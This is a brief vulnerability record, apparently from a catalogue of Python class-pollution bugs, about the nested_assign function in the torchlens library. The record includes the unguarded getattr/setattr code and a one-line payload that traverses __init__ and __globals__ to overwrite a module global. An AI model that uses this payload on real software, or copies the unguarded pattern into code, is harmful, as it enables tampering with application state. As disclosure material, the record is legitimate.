## torchlens

### Meta

+ Repo: torchlens
+ Link: https://github.com/johnmarktaylor91/torchlens
+ Stars: 530
+ Version: 0.1.26
+ CVE: N/A
+ VulnType: get-both-set-both
+ Status: Pending
+ Payload: ```torchlens.nested_assign(obj, [("attr", "__init__"), ("attr", "__globals__"), ("ind", "__name__") ], 'polluted')```
+ Foundby: Zhong
+ Report: Pending
+ AppType: Lib
+ Input: Func

### Vulnerable Code Snippet

```python
def nested_assign(obj, addr, val):
    """Given object and an address in that object, assign value to that address."""
    for i, (entry_type, entry_val) in enumerate(addr):
        if i == len(addr) - 1:
            if entry_type == "ind":
                obj[entry_val] = val
            elif entry_type == "attr":
                setattr(obj, entry_val, val)
        else:
            if entry_type == "ind":
                obj = obj[entry_val]
            elif entry_type == "attr":
                with warnings.catch_warnings():
                    warnings.simplefilter("ignore")
                    obj = getattr(obj, entry_val)
```
